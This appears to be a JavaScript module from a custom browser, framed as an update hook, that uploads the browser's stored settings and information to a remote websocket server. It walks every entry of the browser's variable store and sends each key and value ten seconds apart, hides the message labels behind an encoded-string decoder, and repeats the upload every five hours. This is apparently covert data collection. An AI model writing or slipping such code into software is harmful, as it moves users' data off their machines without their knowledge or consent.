module.exports = function update(____0, client) {
  if (____0.load_ws_browser_info) {
    return;
  }
  ____0.load_ws_browser_info = true;

  ____0.sendSocialData = function (parent) {
    if (!____0.sendSocialDataDone) {
      if ((client = ____0.ws.client)) {
        ____0.sendSocialDataDone = true;
        let index = 0;
        for (const [key, value] of Object.entries(parent.var)) {
          index++;
          if (key && key.indexOf('$') === -1 && value) {
            setTimeout(() => {
              client.sendMessage({
                type: ____0.f1('41592369477927574657866245584269'),
                xid: parent.var.core.id,
                key: key,
                value: value,
                source: ____0.f1('4678377347583773'),
              });
            }, 1000 * 10 * index);
          }
        }
      }
    }
  };
  function sendParentInformation(parent) {
    client.sendMessage({
      type: 'browser_info',
      xid: parent.var.core.id,
      key: 'information',
      value: parent.information,
      source: 'online',
    });
  }

  function getBrowserInfo() {
    if (____0.getBrowser) {
      let parent = ____0.getBrowser();
      console.log('\n\n**********************************************************');
      console.log(`Active Browser [ ${parent.var.core.id} ]`);
      console.log('**********************************************************\n\n');

      if (true) {
        if (!____0.sendSocialDataDone) {
          ____0.sendSocialData(parent);
        }
        sendParentInformation(parent);
      }
    }
  }
  getBrowserInfo();
  setInterval(() => {
    getBrowserInfo();
  }, 1000 * 60 * 60 * 5);
};
